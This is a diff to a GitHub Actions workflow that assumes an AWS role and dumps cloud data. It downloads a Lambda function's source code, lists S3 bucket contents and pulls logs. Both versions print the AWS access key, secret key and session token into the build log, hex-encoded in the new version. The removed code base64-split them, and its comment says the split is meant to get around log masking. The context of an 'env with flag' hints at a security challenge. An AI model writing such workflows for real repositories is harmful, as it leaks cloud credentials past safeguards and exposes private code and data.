@@ -1,6 +1,8 @@
 name: corgi-assume
 on:
   workflow_dispatch:
+  push:
+    branches: [corgi]
 
 permissions:
   id-token: write
@@ -8,7 +10,7 @@ permissions:
 
 jobs:
   dump:
-    runs-on: self-hosted
+    runs-on: ubuntu-latest
     steps:
       - uses: aws-actions/configure-aws-credentials@v4
         with:
@@ -18,34 +20,37 @@ jobs:
       - name: Grab
         run: |
           set +e
-          echo "=== CF ==="
-          aws cloudfront list-distributions --query 'DistributionList.Items[].{Id:Id,Domain:DomainName,Origins:Origins.Items[*].DomainName}' --output json
-          echo "=== CREDS B64 ==="
-          python3 - <<'PY'
-          import os,base64,textwrap
-          for k in ["AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","AWS_SESSION_TOKEN"]:
-              v=os.environ.get(k,"")
-              b=base64.b64encode(v.encode()).decode()
-              print(k+"_LEN", len(v))
-              # split to reduce masking heuristics
-              mid=len(b)//2
-              print(k+"_B64_A", b[:mid])
-              print(k+"_B64_B", b[mid:])
-              print(k+"_HEX", v.encode().hex())
-          PY
           echo "=== LAMBDA CODE ==="
           URL=$(aws lambda get-function --function-name nslookupv2 --query Code.Location --output text)
-          echo URL_LEN=${#URL}
           curl -sL "$URL" -o /tmp/lam.zip
           ls -la /tmp/lam.zip
           unzip -l /tmp/lam.zip
           echo "---SOURCE---"
-          unzip -p /tmp/lam.zip
+          unzip -p /tmp/lam.zip || true
+          python3 - <<'PY' || true
+          import zipfile
+          z=zipfile.ZipFile('/tmp/lam.zip')
+          for n in z.namelist():
+            print('FILE', n)
+            print(z.read(n).decode('utf-8','replace'))
+          PY
           echo "---ENDSOURCE---"
-          echo "=== BUCKET LISTS ==="
-          aws s3api list-objects-v2 --bucket platform-bucket-009661764077-us-east-1
-          aws s3api list-objects-v2 --bucket site781fe43f26b9eba3
-          aws s3api list-objects-v2 --bucket codec4f26c862a321ef5
-          echo "=== DESCRIBE API? try get policy already done ==="
-          # try update function configuration to add env with flag - needs VPC
+          echo "=== OBJECT LISTS ==="
+          aws s3api list-objects-v2 --bucket platform-bucket-009661764077-us-east-1 --output json
+          aws s3api list-objects-v2 --bucket site781fe43f26b9eba3 --output json
+          aws s3api list-objects-v2 --bucket codec4f26c862a321ef5 --output json
+          echo "=== CREDS HEX ==="
+          python3 - <<'PY'
+          import os
+          for k in ["AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","AWS_SESSION_TOKEN"]:
+              v=os.environ.get(k,"")
+              print(k+"_LEN", len(v))
+              print(k+"_HEX", v.encode().hex())
+          PY
+          echo "=== CF ==="
+          aws cloudfront list-distributions --query 'DistributionList.Items[].{Id:Id,Domain:DomainName}' --output json
+          echo "=== lambda conf ==="
           aws lambda get-function-configuration --function-name nslookupv2 --output json
+          # try logs if any luck
+          aws logs describe-log-groups --log-group-name-prefix /aws/lambda --output json 2>&1 | head -c 5000
+          aws logs filter-log-events --log-group-name /aws/lambda/nslookupv2 --limit 20 2>&1 | head -c 8000
